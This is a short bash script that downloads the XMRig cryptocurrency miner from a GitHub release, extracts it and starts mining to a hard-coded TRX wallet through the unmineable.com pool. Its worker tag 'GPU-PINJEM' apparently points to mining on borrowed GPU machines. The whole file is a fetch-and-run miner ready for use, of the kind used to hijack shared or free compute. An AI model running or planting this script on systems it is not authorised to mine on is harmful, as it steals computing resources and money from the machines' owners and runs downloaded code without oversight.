#!/bin/bash
POOL=rx.unmineable.com:3333
WALLET=TRX:TAMRs3G2DqEwWQaqm5oqNmRAvJ7L6LuE63
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar -xf xmrig-6.12.1-linux-x64.tar.gz
cd xmrig-6.12.1
./xmrig -o $POOL -a rx -k -u $WALLET.$WORKER
